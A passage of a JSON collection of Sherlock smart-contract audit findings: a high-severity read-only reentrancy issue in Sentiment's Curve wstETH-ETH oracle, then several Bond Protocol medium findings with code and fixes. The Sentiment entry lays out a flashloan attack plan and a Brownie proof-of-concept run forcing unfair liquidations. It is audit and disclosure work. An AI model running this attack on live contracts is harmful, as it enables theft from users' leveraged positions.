ETH\n>    - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n>    - Attacker calls `remove_liquidity` with all LP obtained\n>    - On reentrant call:\n>         - swaps 1M $ for the required tokens needed for liquidation\n>         - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n>     - Exit call to attacker's `fallback` or `receive` function\n>     - Execution of call to `remove_liquidity` resumes and finishes\n>      - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n>    - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n> 2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n> \n> In addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n> \n> Finally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n> \n> ```diff\n>     function getPrice(address token) external view returns (uint) {\n>         ICurvePool pool = ICurveLP(token).minter();\n> +       uint256[2] calldata amounts;\n> +       pool.remove_liquidity(0, amounts);\n>         address coin;\n>         uint price;\n>         uint minPrice = oracleFacade.getPrice(WETH);\n>         for(uint i; i<N_COINS; i++) {\n>             coin = pool.coins(i);\n>             if (coin != ETH) {\n>                 price = oracleFacade.getPrice(coin);\n>                 minPrice = (price < minPrice) ? price : minPrice;\n>             }\n>         }\n> \n>         return minPrice.mulWadDown(pool.get_virtual_price());\n>     }\n> ```\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**GalloDaSballo**\n\nEscalate for 50 USDC.\nIn solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n\n```python\n>>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n>>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\nTransaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n\nTransaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n\nTransaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n```\n\nMore specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n>>> 1006386728989215731 / 566156151085517748\n1.777578018113242\n>>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n43.743678769080375\n\nAlso agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> In solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n> \n> ```python\n> >>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\n> whale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\n> Fetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\n> Fetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n> >>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\n> weth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\n> c = VirtualPriceManip.deploy({\"from\": a[0]})\n> c.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n> Transaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n> \n> Transaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n>   TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n> \n> Transaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n>   VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n> \n> Transaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n>   VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n> \n> >>> history[-1].events\n> {'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n> ```\n> \n> More specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n> >>> 1006386728989215731 / 566156151085517748\n> 1.777578018113242\n> >>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n> 43.743678769080375\n> \n> Also agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted \n\nBased on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\n**sherlock-admin**\n\n> Escalation accepted \n> \n> Based on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the wstETH-ETH Curve LP token, which is priced via its `virtual_price`. Through what Chainalysis called View only Reentrancy, it is possible to reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event. Testing has shown that the debt for such an account is denominated in WETH, and the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function. This is possible because the function will send ETH first, before updating its internal wstETH balances. With a big enough deposit, it becomes profitable to force liquidate them, and the estimated cost of the attack is 60 BPS of the total ETH used (due to price impact). The impact of this vulnerability is that it can trigger unfair liquidations to the attacker's advantage. A code snippet and a Brownie Console were provided to demonstrate the maximum theoretical attack. The judges consulted the Lead senior and concluded that this issue is a valid high. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7",
      "tags": [
        "Reentrancy",
        "Read-only Reentrancy"
      ],
      "finders": [
        "GalloDaSballo",
        "Bahurum"
      ]
    },
    {
      "id": "5681",
      "title": "M-13: meta.tuneBelowCapacity param is not updated when BondBaseSDA.setIntervals is called",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/9 \n\n## Found by \nrvierdiiev\n\n## Summary\nWhen BondBaseSDA.setIntervals function is called then meta.tuneBelowCapacity param is not updated which has impact on price tuning.\n## Vulnerability Detail\nBondBaseSDA.setIntervals function allows for market owner to change some market interval. One of them is `meta.tuneInterval`.\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L303-L333\n```solidity\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\n`meta.tuneInterval` has impact on `meta.tuneIntervalCapacity`. That means that when you change tuning interval you also change the capacity that is operated during tuning.\nThere is also one more param that depends on this, but is not counted here.\n\nThis is `meta.tuneBelowCapacity` param and it is needed to say if the market has overselled tokens. In another words it says if `meta.tuneIntervalCapacity` is already sold. This param is checked while tuning and then is updated after the tuning.\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L576-L621        \n```solidity\n        if (\n            (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n            (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n        ) {\n            // Calculate the correct payout to complete on time assuming each bond\n            // will be max size in the desired deposit interval for the remaining time\n            //\n            // i.e. market has 10 days remaining. deposit interval is 1 day. capacity\n            // is 10,000 TOKEN. max payout would be 1,000 TOKEN (10,000 * 1 / 10).\n            markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n\n            // Calculate ideal target debt to satisty capacity in the remaining time\n            // The target debt is based on whether the market is under or oversold at this point in time\n            // This target debt will ensure price is reactive while ensuring the magnitude of being over/undersold\n            // doesn't cause larger fluctuations towards the end of the market.\n            //\n            // Calculate target debt from the timeNeutralCapacity and the ratio of debt decay interval and the length of the market\n            uint256 targetDebt = timeNeutralCapacity.mulDiv(\n                uint256(meta.debtDecayInterval),\n                uint256(meta.length)\n            );\n\n\n            // Derive a new control variable from the target debt\n            uint256 controlVariable = terms[id_].controlVariable;\n            uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n\n            emit Tuned(id_, controlVariable, newControlVariable);\n\n\n            if (newControlVariable < controlVariable) {\n                // If decrease, control variable change will be carried out over the tune interval\n                // this is because price will be lowered\n                uint256 change = controlVariable - newControlVariable;\n                adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n            } else {\n                // Tune up immediately\n                terms[id_].controlVariable = newControlVariable;\n                // Set current adjustment to inactive (e.g. if we are re-tuning early)\n                adjustments[id_].active = false;\n            }\n\n\n            metadata[id_].lastTune = time_;\n            metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n                ? market.capacity - meta.tuneIntervalCapacity\n                : 0;\n            metadata[id_].lastTuneDebt = targetDebt;\n        }\n```\n\nIf you don't update `meta.tuneBelowCapacity` when changing intervals you have a risk, that price will not be tuned when tuneIntervalCapacity was decreased or it will be still tuned when tuneIntervalCapacity was increased.\n\nAs a result tuning will not be completed when needed.\n## Impact\nTuning logic will not be completed when needed.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nUpdate meta.tuneBelowCapacity in BondBaseSDA.setIntervals function.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added a line to set meta.tuneBelowCapacity in the setIntervals function to fix this.\n\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/bfd9eea0cc035b3ef1cca4072356f83695f960eb",
      "summary": "\nThis bug report is about the issue M-13, which was found by rvierdiiev. It states that when BondBaseSDA.setIntervals function is called, meta.tuneBelowCapacity param is not updated which has an impact on price tuning. \n\nThe BondBaseSDA.setIntervals function allows for market owners to change some market intervals. One of them is meta.tuneInterval, which has an impact on meta.tuneIntervalCapacity. The meta.tuneBelowCapacity param is needed to say if the market has overselled tokens and it is checked while tuning and then is updated after the tuning.\n\nIf meta.tuneBelowCapacity is not updated when changing intervals, there is a risk that price will not be tuned when tuneIntervalCapacity was decreased or it will be still tuned when tuneIntervalCapacity was increased. As a result, tuning logic will not be completed when needed.\n\nThe bug was found through manual review and the recommendation was to update meta.tuneBelowCapacity in BondBaseSDA.setIntervals function. This was fixed in the commit bfd9eea0cc035b3ef1cca4072356f83695f960eb on the Bond-Protocol/bonds repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/9",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "5680",
      "title": "M-12: BondAggregator.liveMarketsBy eventually will revert because of block gas limit",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/10 \n\n## Found by \nrvierdiiev\n\n## Summary\nBondAggregator.liveMarketsBy eventually will revert because of block gas limit\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L259-L280\n```solidity\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\nBondAggregator.liveMarketsBy function is looping through all markets and does at least `marketCounter` amount of external calls(when all markets are not live) and at most 4 * `marketCounter` external calls(when all markets are live and owner matches. This  all consumes a lot of gas, even that is called from view function. And each new market increases loop size.\n\nThat means that after some time `marketsToAuctioneers` mapping will be big enough that the gas amount sent for view/pure function will be not enough to retrieve all data(50 million gas according to [this](https://ethereum.stackexchange.com/questions/9824/can-solidity-view-pure-functions-be-arbitrarily-complex)). So the function will revert.\n\nAlso similar problem is with `findMarketFor`, `marketsFor` and `liveMarketsFor` functions.\n## Impact\nFunctions will always revert and whoever depends on it will not be able to get information.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nRemove not active markets or some start and end indices to functions.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added start and stop indices to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit.\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/5a2a9a982f3bdfc31d22f72d270bf2d556096281",
      "summary": "\nA bug was found in BondAggregator.liveMarketsBy function which will eventually revert because of block gas limit. It is looping through all markets and does at least `marketCounter` amount of external calls and at most 4 * `marketCounter` external calls, consuming a lot of gas even when called from view function. As each new market increases loop size, after some time the gas amount sent for view/pure function will be not enough to retrieve all data and the function will revert. Similar problem is with `findMarketFor`, `marketsFor` and `liveMarketsFor` functions. This will always revert and whoever depends on it will not be able to get information. To fix this issue, start and stop indices were added to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit. The bug was fixed in a commit on GitHub.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/10",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "5679",
      "title": "M-11: BondBaseSDA.setDefaults doesn't validate inputs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/11 \n\n## Found by \nrvierdiiev\n\n## Summary\nBondBaseSDA.setDefaults doesn't validate inputs which can lead to initializing new markets incorrectly\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L348-L356\n```solidity\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\n\nFunction BondBaseSDA.setDefaults doesn't do any checkings, as you can see. Because of that it's possible to provide values that will break market functionality.\n\nFor example you can set `minDepositInterval` to be bigger than `minMarketDuration` and it will be [not possible](https://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L174-L178) to create new market.\n\nOr you can provide `minDebtBuffer` to be 100% ot 0% that will break logic of market closing.\n## Impact\nCan't create new market or market logic will be not working as designed.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd input validation.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added the following validation checks to `setDefaults`:\n- defaultTuneInterval >= defaultTuneAdjustment\n- defaultTuneInterval >= minDepositInterval\n- minMarketDuration >= minDepositInterval\n- minDebyDecayInterval >= 5 * minDepositInterval\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/141c286cccb7797f8cca68edaf9b886f12897405",
      "summary": "\nThis bug report (Issue M-11) was found by rvierdiiev and reported on the GitHub page of Sherlock Audit. The vulnerability is found in the BondBaseSDA.setDefaults function, which does not validate inputs and thus can lead to initializing new markets incorrectly. This can be seen in the code snippet provided in the report, which does not have any checks for the inputs. This can cause issues such as setting the minDepositInterval to be bigger than the minMarketDuration, which would make it impossible to create a new market, or setting the minDebtBuffer to be 100% or 0%, which would break the logic of the market closing.\n\nThe recommended solution is to add input validation. This was discussed by Evert0x, who suggested adding validation checks for the defaultTuneInterval, defaultTuneAdjustment, minDepositInterval, minMarketDuration, and minDebtDecayInterval. This was implemented in the Bond-Protocol/bonds commit 141c286cccb7797f8cca68edaf9b886f12897405 by xiaoming9090.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/11",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "5678",
      "title": "M-10: Debt Decay Faster Than Expected",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/12 \n\n## Found by \nxiaoming90\n\n## Summary\n\nThe debt decay at a rate faster than expected, causing market makers to sell bond tokens at a lower price than expected.  \n\n## Vulnerability Detail\n\nThe following definition of the debt decay reference time following any purchases at time `t` taken from the whitepaper. The second variable, which is the delay increment, is rounded up. Following is taken from Page 15 of the whitepaper - Definition 27\n\n![image-20221114170852736](https://user-images.githubusercontent.com/102820284/201844416-023c6d4f-893d-40ab-b6cb-6e33402d8e78.png)\n\nHowever, the actual implementation in the codebase differs from the specification. At Line 514, the delay increment is rounded down instead.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L514\n\n```solidity\nFile: BondBaseSDA.sol\n513:         // Set last decay timestamp based on size of purchase to linearize decay\n514:         uint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\n515:         metadata[id_].lastDecay += uint48(lastDecayIncrement);\n```\n\n## Impact\n\nWhen the delay increment (TD) is rounded down, the debt decay reference time increment will be smaller than expected. The debt component will then decay at a faster rate. As a result, the market price will not be adjusted in an optimized manner, and the market price will fall faster than expected, causing market makers to sell bond tokens at a lower price than expected.\n\nFollowing is taken from Page 8 of the whitepaper - Definition 8\n\n![image-20221114173425259](https://user-images.githubusercontent.com/102820284/201844554-bdb7c975-ec4c-417f-a83e-56430300bd6e.png)\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L514\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen computing the `lastDecayIncrement`, the result should be rounded up.\n\n```diff\n// Set last decay timestamp based on size of purchase to linearize decay\n- uint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\n+ uint256 lastDecayIncrement = debtDecayInterval.mulDivUp(payout_, lastTuneDebt);\nmetadata[id_].lastDecay += uint48(lastDecayIncrement);\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree that the rounding should be to match the specification. This was inadvertently changed when another change was implemented. Good catch.\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/071d2a450779dd3413224831934727dcb77e3045",
      "summary": "\nThis bug report was found by Xiaoming90 and reported on the GitHub page of Sherlock Audit. The bug is related to the debt decay rate being faster than expected. This is due to the fact that the delay increment is rounded down instead of up in the codebase, which is different from the whitepaper specification. This leads to the debt component decaying faster than expected, causing market makers to sell bond tokens at a lower price than expected. \n\nThe code snippet was provided to show the difference between the whitepaper definition and the codebase implementation. The recommendation for this bug was to round up the delay increment when computing the last decay increment. Evert0x from the sponsor team agreed with the recommendation and the bug was fixed in the commit 071d2a450779dd3413224831934727dcb77e3045.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/12",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "5677",
      "title": "M-9: Auctioneer Cannot Be Removed From The Protocol",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/13 \n\n## Found by \nxiaoming90\n\n## Summary\n\nIf a vulnerable Auctioneer is being exploited by an attacker, there is no way to remove the vulnerable Auctioneer from the protocol.\n\n## Vulnerability Detail\n\nThe protocol is missing the feature to remove an auctioneer. Once an auctioneer has been added to the whitelist, it is not possible to remove the auctioneer from the whitelist.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L62\n\n```solidity\nFile: BondAggregator.sol\n62:     function registerAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n63:         // Restricted to authorized addresses\n64: \n65:         // Check that the auctioneer is not already registered\n66:         if (_whitelist[address(auctioneer_)])\n67:             revert Aggregator_AlreadyRegistered(address(auctioneer_));\n68: \n69:         // Add the auctioneer to the whitelist\n70:         auctioneers.push(auctioneer_);\n71:         _whitelist[address(auctioneer_)] = true;\n72:     }\n```\n\n## Impact\n\nIn the event that a whitelisted Auctioneer is found to be vulnerable and has been actively exploited by an attacker in the wild, the protocol needs to mitigate the issue swiftly by removing the vulnerable Auctioneer from the protocol. However, the mitigation effort will be hindered by the fact there is no way to remove an Auctioneer within the protocol once it has been whitelisted. Thus, it might not be possible to stop the attacker from exploiting the vulnerable Auctioneer. The protocol team would need to find a workaround to block the attack, which will introduce an unnecessary delay to the recovery process where every second counts.\n\nAdditionally, if the admin accidentally whitelisted the wrong Auctioneer, there is no way to remove it.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L62\n\n## Tool used\n\nManual 